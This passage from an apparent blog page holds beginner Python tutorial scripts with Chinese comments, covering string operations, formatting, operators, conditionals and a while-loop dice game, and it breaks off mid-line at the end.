5</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s3)</span><br><span class=\"line\"># print(s4)</span><br><span class=\"line\"></span><br><span class=\"line\"># in 在字符串内</span><br><span class=\"line\"></span><br><span class=\"line\">name = &#x27;steven&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = &#x27;ste&#x27; in name # in的返回值是布尔类型</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># not in 没在字符串内</span><br><span class=\"line\"></span><br><span class=\"line\">result = &#x27;tv&#x27; not in name</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># % 字符串的格式化</span><br><span class=\"line\">print(&#x27;%s says: %s&#x27; % (name, &#x27;Everybody should study hard!&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># r 保留原格式</span><br><span class=\"line\">print(r&#x27;%s says: \\&#x27;hahaha!\\&#x27; &#x27; % name) # 用r则有转义字符不进行转义</span><br><span class=\"line\">print(&#x27;%s says: \\&#x27;hahaha!\\&#x27; &#x27; % name)</span><br><span class=\"line\"></span><br><span class=\"line\"># [] [start:end] 切片</span><br><span class=\"line\">filename = &#x27;picture.png&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 位置都是从0开始，位置称作下标或索引</span><br><span class=\"line\">print(filename[5]) # 通过[]可以结合位置 获取字母  特点：只能获取一个字母</span><br><span class=\"line\"></span><br><span class=\"line\"># range(1,10) ---&gt; [1:10]</span><br><span class=\"line\"></span><br><span class=\"line\">print(filename[0:7]) # 包括前面不包括后面</span><br><span class=\"line\"></span><br><span class=\"line\">print(filename[3:7]) # 截取字符串</span><br><span class=\"line\"></span><br><span class=\"line\"># 省略</span><br><span class=\"line\">print(filename[3:]) # 省略后面表示取到结尾</span><br><span class=\"line\">print(filename[:7]) # 省略前面表示从0开始取值</span><br><span class=\"line\"></span><br><span class=\"line\"># 负数</span><br><span class=\"line\">print(filename[8:-1])</span><br><span class=\"line\">print(filename[:-2])</span><br><span class=\"line\">print(filename[-1:])</span><br><span class=\"line\">print(filename[-5:-1])</span><br><span class=\"line\">print(filename[10:0])</span><br><span class=\"line\"></span><br><span class=\"line\"># [start:end:step]</span><br><span class=\"line\">print(filename[::-1]) # 倒叙</span><br><span class=\"line\"></span><br><span class=\"line\">str1 = &#x27;abcdefg&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(str1[-1:-5:-1])</span><br><span class=\"line\">print(str1[5:0:-1]) # 取值方向需与取值方向一致</span><br><span class=\"line\">print(&#x27;----&gt;&#x27;,str1[5:0:1])</span><br><span class=\"line\"></span><br><span class=\"line\"># 指定步长取值</span><br><span class=\"line\">print(str1[6:0:-2])</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"str-demo-py\"><a href=\"#str-demo-py\" class=\"headerlink\" title=\"str_demo.py\"></a>str_demo.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 定义常量</span><br><span class=\"line\"># java: final</span><br><span class=\"line\"># python:命名的时候，名字是大写</span><br><span class=\"line\"></span><br><span class=\"line\">NAME = &#x27;Jack&#x27;</span><br><span class=\"line\">print(NAME)</span><br><span class=\"line\">print(&#x27;hello&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">value = &#x27;hello&#x27;</span><br><span class=\"line\">print(value)</span><br><span class=\"line\"></span><br><span class=\"line\">value = &#x27;python&#x27;</span><br><span class=\"line\">print(value)</span><br><span class=\"line\"></span><br><span class=\"line\">value = &quot;hello python&quot;</span><br><span class=\"line\">print(value)</span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串表示： &#x27;&#x27;;  &quot;&quot;;  &#x27;&#x27;&#x27; &#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">message = &#x27;[taobao] You are trying using verification code to login, \\nthe code is: 8906,&#x27; \\</span><br><span class=\"line\">\t\t  &#x27;\\nit involves personal account security, so Please keep it confidential.&#x27;</span><br><span class=\"line\">print(message)</span><br><span class=\"line\"></span><br><span class=\"line\">message1 = &#x27;&#x27;&#x27;</span><br><span class=\"line\">[taobao] </span><br><span class=\"line\">You are trying using verification code to login,</span><br><span class=\"line\">the code is: 8906,</span><br><span class=\"line\">it involves personal account security, so Please keep it confidential.</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(message1)</span><br><span class=\"line\"></span><br><span class=\"line\">email_message = &#x27;&#x27;&#x27;</span><br><span class=\"line\">Dear Zhaofei:</span><br><span class=\"line\">\tThe TiktoK account you just registrated has not yet been activated, </span><br><span class=\"line\">please click below links to activate it!</span><br><span class=\"line\">\tClick this: Activate!!!</span><br><span class=\"line\">\tOnce the account is activated, you can watch all the videos online!</span><br><span class=\"line\"></span><br><span class=\"line\">from: Tiktok team</span><br><span class=\"line\">\t </span><br><span class=\"line\">\t date: 2019/05/29</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(email_message)</span><br><span class=\"line\"></span><br><span class=\"line\"># 三引号的作用： 1.定义一个变量并赋值字符串时，需要保留字符串的格式的时候使用</span><br><span class=\"line\">#\t\t\t\t2.作为多行注释的时候使用</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"str-var-py\"><a href=\"#str-var-py\" class=\"headerlink\" title=\"str_var.py\"></a>str_var.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 格式化输出</span><br><span class=\"line\"></span><br><span class=\"line\">person = &#x27;The Great Sage&#x27;</span><br><span class=\"line\">address = &#x27;4 / F, Zhicheng Science and Technology Building, &#x27; \\</span><br><span class=\"line\">\t\t  &#x27;\\nZhongguancun, Haidian District, Beijing&#x27;</span><br><span class=\"line\">phone = &#x27;15858588888&#x27;</span><br><span class=\"line\">num = 5</span><br><span class=\"line\"></span><br><span class=\"line\"># 用&#x27;+&#x27;符号拼接，字符串 + 字符串 --&gt; OK ； 字符串 + 整型 --&gt; TypeError</span><br><span class=\"line\">print(&#x27;The order is addressed to:&#x27;+person+ \\</span><br><span class=\"line\">\t&#x27;\\nReceiver address is:&#x27;+address+ \\</span><br><span class=\"line\">\t&#x27;\\nContacte:&#x27;+phone+&#x27;\\nQuantity of Goods:&#x27;+str(num))</span><br><span class=\"line\"></span><br><span class=\"line\">print()</span><br><span class=\"line\"></span><br><span class=\"line\"># 用%s占位符，后面依序添加对应变量%()</span><br><span class=\"line\">print(&#x27;The order is addressed to:%s, \\</span><br><span class=\"line\">\t\\nReceiver address is:%s, \\nContacte:%s, \\</span><br><span class=\"line\">\t\\nQuantity of Goods:%s&#x27; %(person, address, phone, num))</span><br><span class=\"line\"></span><br><span class=\"line\">print()</span><br><span class=\"line\"></span><br><span class=\"line\"># 用f&#x27;...&#123;变量&#125;...&#x27; 格式化输出</span><br><span class=\"line\"></span><br><span class=\"line\">print(f&#x27;The order is addressed to:&#123;person&#125;, \\</span><br><span class=\"line\">\t\\nReceiver address is:&#123;address&#125;, \\nContacte:&#123;phone&#125;, \\</span><br><span class=\"line\">\t\\nQuantity of Goods:&#123;num&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：打印个人信息</span><br><span class=\"line\"></span><br><span class=\"line\">name = &#x27;admin&#x27;</span><br><span class=\"line\">age = 18</span><br><span class=\"line\">clazz = &#x27;python&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">msg = &#x27;&#x27;&#x27;</span><br><span class=\"line\">Profile:</span><br><span class=\"line\">My name is %s,</span><br><span class=\"line\">I&#x27;m %s years old,</span><br><span class=\"line\">and studying in class %s</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27; %(name, age, clazz)</span><br><span class=\"line\"></span><br><span class=\"line\">print(msg)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"str-format-py\"><a href=\"#str-format-py\" class=\"headerlink\" title=\"str_format.py\"></a>str_format.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">age = 19</span><br><span class=\"line\"># str(int) ---&gt; (int -&gt; str)  强制类型转换</span><br><span class=\"line\">print(&#x27;age is:&#x27;+str(age))</span><br><span class=\"line\">print(&#x27;age is:%s&#x27; % age) # %s --&gt; str简写  底层：str(age)</span><br><span class=\"line\">isMarry=False # 布尔类型  </span><br><span class=\"line\">print(&#x27;Marry or not? Answer:%s&#x27; %isMarry) # str(False) ---&gt; &#x27;False&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># %d  digit  数字</span><br><span class=\"line\">print(&#x27;age is:%d&#x27; % age)</span><br><span class=\"line\"></span><br><span class=\"line\">age = &#x27;18&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;age is:%d&#x27; % int(age))</span><br><span class=\"line\"></span><br><span class=\"line\">age = 18.5 # int(18.5) ---&gt; 取整数</span><br><span class=\"line\">print(&#x27;age is:%d&#x27; % age)</span><br><span class=\"line\"></span><br><span class=\"line\">year = 2019</span><br><span class=\"line\">print(&#x27;The year is:%06d&#x27; % year)</span><br><span class=\"line\"></span><br><span class=\"line\"># %f  float 小数点后面的位数， 而且是四舍五入</span><br><span class=\"line\">salary=8899.99</span><br><span class=\"line\">print(&#x27;my salary is:%.2f&#x27; % salary)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"str-format02-py\"><a href=\"#str-format02-py\" class=\"headerlink\" title=\"str_format02.py\"></a>str_format02.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 字符串的格式化输出</span><br><span class=\"line\"># 方式：1.使用占位符；2.format()函数</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># format是一个字符串中的函数 &#x27;&#x27;.format()  此处的‘ . ’表示调用</span><br><span class=\"line\">age = 2</span><br><span class=\"line\">s=&#x27;already&#x27;</span><br><span class=\"line\">message = &#x27;George says:I\\&#x27;m &#123;&#125; years old now，&#123;&#125; in kindergarten!&#x27;.format(age,s)</span><br><span class=\"line\">print(message)</span><br><span class=\"line\"></span><br><span class=\"line\">name = &#x27;George&#x27;</span><br><span class=\"line\">age = 3</span><br><span class=\"line\">hobby = &#x27;play dinosaur!&#x27;</span><br><span class=\"line\">money = 5.89</span><br><span class=\"line\"></span><br><span class=\"line\">message = &#x27;&#123;&#125; is &#123;&#125; years old, he likes to &#123;&#125;, \\</span><br><span class=\"line\">\\nand he has &#123;&#125; yuan pocket money&#x27;.format(name,age,hobby,money)</span><br><span class=\"line\"></span><br><span class=\"line\">print(message)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"input-demo-py\"><a href=\"#input-demo-py\" class=\"headerlink\" title=\"input_demo.py\"></a>input_demo.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 输入: input()函数</span><br><span class=\"line\"># 所输入的都是字符串类型</span><br><span class=\"line\">name = input(&#x27;please input the name: &#x27;) # 阻塞式</span><br><span class=\"line\"></span><br><span class=\"line\">print(name)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"operator-01-py\"><a href=\"#operator-01-py\" class=\"headerlink\" title=\"operator_01.py\"></a>operator_01.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 一， 赋值运算符</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. = </span><br><span class=\"line\">name = &#x27;admin&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">name1 = name</span><br><span class=\"line\"></span><br><span class=\"line\">print(id(name),name)</span><br><span class=\"line\">print(id(name1),name1)</span><br><span class=\"line\"></span><br><span class=\"line\"># id() 返回内存地址</span><br><span class=\"line\"></span><br><span class=\"line\"># 扩展后的赋值符号： +=  -=  *=  /=  ....</span><br><span class=\"line\"></span><br><span class=\"line\">num = 8</span><br><span class=\"line\">num += 5  # num = num + 5  此时的+表示数学加号</span><br><span class=\"line\">print(num)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">a=&#x27;abc&#x27;</span><br><span class=\"line\">a +=&#x27;ff&#x27;  # a = a + &#x27;ff&#x27;  此时的+表示连接符</span><br><span class=\"line\">print(a)</span><br><span class=\"line\"></span><br><span class=\"line\"># -=, *=, /= 只应用在数值，字符串不支持</span><br><span class=\"line\"></span><br><span class=\"line\"># 二，+ - * / 算术运算符</span><br><span class=\"line\"># 扩展的算术运算符: **  //  %</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;*&#x27; * 10) # 输出成倍字符串</span><br><span class=\"line\"></span><br><span class=\"line\">a=8</span><br><span class=\"line\">b=2</span><br><span class=\"line\"></span><br><span class=\"line\">result = a ** b  # 次方/幂计算</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">result = a // b # 整除</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 三，关系运算符 &gt;  &lt;  &gt;= &lt;=  ==  !=</span><br><span class=\"line\">m1=&#x27;hello&#x27;</span><br><span class=\"line\">m2=&#x27;hello&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result= m1==m2</span><br><span class=\"line\">print(&#x27;m1==m2&#x27;, result)</span><br><span class=\"line\"></span><br><span class=\"line\">result= m1 != m2</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># is  用于对象/内存地址的比较</span><br><span class=\"line\"></span><br><span class=\"line\">age=20</span><br><span class=\"line\"></span><br><span class=\"line\">age1=20</span><br><span class=\"line\"></span><br><span class=\"line\">print(id(age))</span><br><span class=\"line\">print(id(age1))</span><br><span class=\"line\"></span><br><span class=\"line\">print(age is age1)</span><br><span class=\"line\"></span><br><span class=\"line\">money=2000000</span><br><span class=\"line\">salary=600000</span><br><span class=\"line\"></span><br><span class=\"line\">print(id(money))</span><br><span class=\"line\">print(id(salary))</span><br><span class=\"line\"></span><br><span class=\"line\">print(money is salary)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 四，逻辑运算符 and   or   not</span><br><span class=\"line\">#逻辑与</span><br><span class=\"line\">#逻辑或</span><br><span class=\"line\">#逻辑非</span><br><span class=\"line\"></span><br><span class=\"line\"># 逻辑运算符的运算结果也是返回True  False</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"operator-binary-py\"><a href=\"#operator-binary-py\" class=\"headerlink\" title=\"operator_binary.py\"></a>operator_binary.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 位运算</span><br><span class=\"line\"></span><br><span class=\"line\"># 二进制： 0  1</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">      1   1</span><br><span class=\"line\"></span><br><span class=\"line\">8  4  2   1</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">a=3</span><br><span class=\"line\">print(bin(a)) #输出 0b 11</span><br><span class=\"line\"></span><br><span class=\"line\">a=13</span><br><span class=\"line\">print(bin(a)) # 0b 1101</span><br><span class=\"line\"></span><br><span class=\"line\">b=0b10111  # 0b 表示二进制</span><br><span class=\"line\">print(int(b)) # int()转十进制</span><br><span class=\"line\"></span><br><span class=\"line\">c=-8</span><br><span class=\"line\">print(bin(c)) # -0b1000</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">-5</span><br><span class=\"line\">5: 0000   0  1  0  1</span><br><span class=\"line\">取反（反码）： 1111  1  0  1  0</span><br><span class=\"line\">加1： 1111  1 0 1 1</span><br><span class=\"line\">字节byte:</span><br><span class=\"line\">0000 0101</span><br><span class=\"line\">一个字节(byte)表示8个二进制位(bit)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">c= 0o6430  # 0o 开头的都是八进制</span><br><span class=\"line\">print(int(c))</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">n= 0o6430</span><br><span class=\"line\"></span><br><span class=\"line\">6       4       3       0</span><br><span class=\"line\"></span><br><span class=\"line\">8^3     8^2     8^1     8^0   转十进制： 6*512+4*64+3*8+0=3352</span><br><span class=\"line\"></span><br><span class=\"line\">110     100     011     000   转二进制： 110100011000</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 0x开头表示十六进制  0-9  a-f</span><br><span class=\"line\">d= 0x9ab16</span><br><span class=\"line\">print(int(d))</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">n=0x9ab16</span><br><span class=\"line\"></span><br><span class=\"line\">9        a        b        1         6</span><br><span class=\"line\"></span><br><span class=\"line\">1001    1010     1011     0001     0110  # 十六进制转二进制</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">&amp;</span><br><span class=\"line\">|</span><br><span class=\"line\">!(~)</span><br><span class=\"line\">^</span><br><span class=\"line\">&lt;&lt;</span><br><span class=\"line\">&gt;&gt;</span><br><span class=\"line\">位运算符</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(3 &amp; 2)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">&amp; 与运算  类似 and</span><br><span class=\"line\">1:True   0:False</span><br><span class=\"line\">  </span><br><span class=\"line\">  0000 0011</span><br><span class=\"line\">&amp; 0000 0010</span><br><span class=\"line\">------------</span><br><span class=\"line\">  0000 0010</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> | 或运算  类似 or</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(5 | 3)</span><br><span class=\"line\"></span><br><span class=\"line\">print(~5) # 取反 将十进制的数字对应的二进制进行取反操作</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">  0000 0101</span><br><span class=\"line\"> 取反：</span><br><span class=\"line\">  1111 1010</span><br><span class=\"line\"> 看第一位（第一位是符号位，只要第一位是1就是负数，第一位是0就是正数）</span><br><span class=\"line\"></span><br><span class=\"line\">  1111 1001 # 减一</span><br><span class=\"line\"></span><br><span class=\"line\">  0000 0110 # 取反</span><br><span class=\"line\">      4+2=6 # 转换十进制</span><br><span class=\"line\">      结合前面得出的是负数，结果为-6</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 异或 ^   相同的是0，不同的是1</span><br><span class=\"line\"></span><br><span class=\"line\">print(3 ^ 5)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">3   0000 0011</span><br><span class=\"line\">5   0000 0101</span><br><span class=\"line\">--------------</span><br><span class=\"line\">\t0000 0110 = 6</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 左移 &lt;&lt;</span><br><span class=\"line\"></span><br><span class=\"line\">print(2&lt;&lt;1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(2&gt;&gt;1)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">2  0000 0010</span><br><span class=\"line\">   0000 0100 左移一位，右侧补0：4</span><br><span class=\"line\">   左移： m&lt;&lt;n --&gt; m*(2的n次方)</span><br><span class=\"line\"></span><br><span class=\"line\">   0000 0010</span><br><span class=\"line\">   0000 0001 右移一位，左侧符号位补0：1</span><br><span class=\"line\">   右移： m&gt;&gt;n --&gt; m//(2的n次方)取整</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(-0b1000000) # -64</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"operator-sanmu-py\"><a href=\"#operator-sanmu-py\" class=\"headerlink\" title=\"operator_sanmu.py\"></a>operator_sanmu.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 三目运算符</span><br><span class=\"line\"></span><br><span class=\"line\"># 格式:结果 if 表达式 else 结果</span><br><span class=\"line\">a=6</span><br><span class=\"line\">b=5</span><br><span class=\"line\">result=(a+b) if a&lt;b else (b-a) # 表达式为True取if前面的结果，否则取else后面的结果</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 运算符的优先级</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"> 排序：</span><br><span class=\"line\">**</span><br><span class=\"line\">~</span><br><span class=\"line\">+ - （符号运算符）</span><br><span class=\"line\">* / // %</span><br><span class=\"line\">+ - 加减</span><br><span class=\"line\">&lt;&lt; &gt;&gt;</span><br><span class=\"line\">&amp;</span><br><span class=\"line\">^</span><br><span class=\"line\">|</span><br><span class=\"line\">== != &gt; &gt;= &lt; &lt;=</span><br><span class=\"line\">is  is not</span><br><span class=\"line\">not</span><br><span class=\"line\">and</span><br><span class=\"line\">or</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"statement-py\"><a href=\"#statement-py\" class=\"headerlink\" title=\"statement.py\"></a>statement.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">变量</span><br><span class=\"line\">运算符</span><br><span class=\"line\">语句：</span><br><span class=\"line\">条件判断语句</span><br><span class=\"line\">for循环语句</span><br><span class=\"line\">跳转语句</span><br><span class=\"line\"></span><br><span class=\"line\">条件语句：</span><br><span class=\"line\">应用场景： </span><br><span class=\"line\">1. 用户名和密码登录</span><br><span class=\"line\">2. 用户登录验证（看影院信息，判断用户是否登录，没登录则弹出窗口，已登录则看到信息）</span><br><span class=\"line\"></span><br><span class=\"line\">if 条件：</span><br><span class=\"line\">\t条件成立执行的语句</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">username=&#x27;admin&#x27; # 没有登录</span><br><span class=\"line\"># python：判断的变量是：&#x27;&#x27;，0，None 默认是False，否则为True</span><br><span class=\"line\"></span><br><span class=\"line\">if username!=&#x27;&#x27;:</span><br><span class=\"line\">\tprint(&#x27;login success&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-&#x27; *20)</span><br><span class=\"line\"></span><br><span class=\"line\">num=9</span><br><span class=\"line\"></span><br><span class=\"line\">if num: # 等效if num!=0:</span><br><span class=\"line\">\tprint(&#x27;--&#x27; *20, &#x27;&gt;&#x27;, num, sep=&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 需求：判断年龄是否大于18，并且判断是否输入了用户名，</span><br><span class=\"line\"># 条件满足则打印xxx今年xxx岁</span><br><span class=\"line\"></span><br><span class=\"line\">age= int(input(&#x27;please input your age: &#x27;))</span><br><span class=\"line\">username= input(&#x27;please input your username: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">if age&gt;19 and username:</span><br><span class=\"line\">\tprint(&#x27;&#123;&#125; is &#123;&#125; years old&#x27;.format(username,age))</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;---game over---&#x27;)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># if...else...</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">消消乐：</span><br><span class=\"line\">\tlv1</span><br><span class=\"line\">\tlv2</span><br><span class=\"line\">\t....</span><br><span class=\"line\"></span><br><span class=\"line\">  lv1: 免费玩，随便玩</span><br><span class=\"line\">  lv2: 充值  买道具  随便玩</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;*&#x27; *10, &#x27;welcome to game &quot;Eliminate all&quot;&#x27;, &#x27;*&#x27; *10)</span><br><span class=\"line\">level = input(&#x27;please input your level(lv1, lv2): &#x27;)</span><br><span class=\"line\">if level == &#x27;lv1&#x27;:</span><br><span class=\"line\">\tprint(&#x27;play for free and play to your hearts content&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">\tprint(&#x27;Pay-per-view level, please pay to continue&#x27;)</span><br><span class=\"line\">\tmoney = int(input(&#x27;click here to pay(In multiples of 100): &#x27;))</span><br><span class=\"line\">\t# if嵌套</span><br><span class=\"line\">\tif money%100==0 and money&gt;0:</span><br><span class=\"line\">\t\tprint(&#x27;Recharge success, Recharge amount is&#x27;, money)</span><br><span class=\"line\">\telse:</span><br><span class=\"line\">\t\tprint(&#x27;Recharge fail, recharge amount has to be multiples of 100!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 随机数</span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">print(random.randint(1,10))</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：猜大小</span><br><span class=\"line\"></span><br><span class=\"line\">ran = random.randint(1,10)</span><br><span class=\"line\">num = int(input(&#x27;please input a number: &#x27;))</span><br><span class=\"line\">if ran == num:</span><br><span class=\"line\">\tprint(&#x27;Good guess! You are right!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">else:</span><br><span class=\"line\">\tprint(&#x27;Guess wrong! Next time!&#x27;)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 多层条件判断：if...elif...else</span><br><span class=\"line\">age = 30</span><br><span class=\"line\">if age &lt;=18 and age &gt; 0:</span><br><span class=\"line\">\tprint(&#x27;Bingo, good instinct!&#x27;)</span><br><span class=\"line\">elif age &gt; 18 and age &lt;=30:</span><br><span class=\"line\">\tprint(&#x27;I\\&#x27;m still a baby!&#x27;)</span><br><span class=\"line\">elif age &gt; 30 and age &lt;= 40:</span><br><span class=\"line\">\tprint(&#x27;What a young man you are!&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">\tprint(&#x27;System wrong!&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"while-demo-py\"><a href=\"#while-demo-py\" class=\"headerlink\" title=\"while_demo.py\"></a>while_demo.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># 需求：打印1-30之间的数字，并且是3和5的倍数</span><br><span class=\"line\">n=3</span><br><span class=\"line\">while n&lt;=30:</span><br><span class=\"line\">\tif n%3==0 and n%5==0:</span><br><span class=\"line\">\t\tprint(&#x27;********&gt;&#x27;,n)</span><br><span class=\"line\">\tn+=1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：赌场游戏</span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">username = input(&#x27;please input your name: &#x27;)</span><br><span class=\"line\">money = 0</span><br><span class=\"line\">answer = input(&#x27;Are you sure to play the game(y/n)? &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">if answer == &#x27;y&#x27;:</span><br><span class=\"line\">\t# 反复充值</span><br><span class=\"line\">\twhile money&lt;2:</span><br><span class=\"line\">\t\tn = int(input(&#x27;Insufficient balance, please recharge\\</span><br><span class=\"line\">(100 yuan equals 30 tokens, and recharge amount has to be multiples of 100): &#x27;))</span><br><span class=\"line\">\t\tif n%100==0 and n&gt;0:</span><br><span class=\"line\">\t\t\tmoney=(n//100)*30</span><br><span class=\"line\">\t\tprint(&#x27;Your current balance is &#123;&#125; tokens,\\</span><br><span class=\"line\">each game will cost you 2 tokens&#x27;.format(money))</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tprint(&#x27;welcome to game, have fun!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\twhile True:</span><br><span class=\"line\">\t\t\t# 模拟骰子，产生骰子的值</span><br><span class=\"line\">\t\t\tt1 = random.randint(1,6)</span><br><span class=\"line\">\t\t\tt2 = random.randint(1,6)</span><br><span class=\"line\">\t\t\t# 两个骰子的值大于6即为大，否则为小</span><br><span class=\"line\">\t\t\tmoney-=2 # 扣除金币</span><br><span class=\"line\">\t\t\tprint(&#x27;system shuffle complete, please guess big or small!&#x27;)</span><br><span class=\"line\">\t\t\tguess = input(&#x27;please input big or small: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tif ((t1+t2&gt;6) and guess==&#x27;big&#x27;) or ((t1+t2&lt;=6) and guess==&#x27;small&#x27;):</span><br><span class=\"line\">\t\t\t\tprint(&#x27;Congratuations &#123;&#125;!\\</span><br><span class=\"line\">You earned one coin in this game!&#x27;.format(username))</span><br><span class=\"line\">\t\t\t\tmoney+=1</span><br><span class=\"line\">\t\t\telse:</span><br><span class=\"line\">\t\t\t\tprint(&#x27;Pity! You lose in this game!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tanswer = input(&#x27;Do you want to continue? It will cost you 2 tokens if yes!(y/n)&#x27;)</span><br><span class=\"line\">\t\t\tif 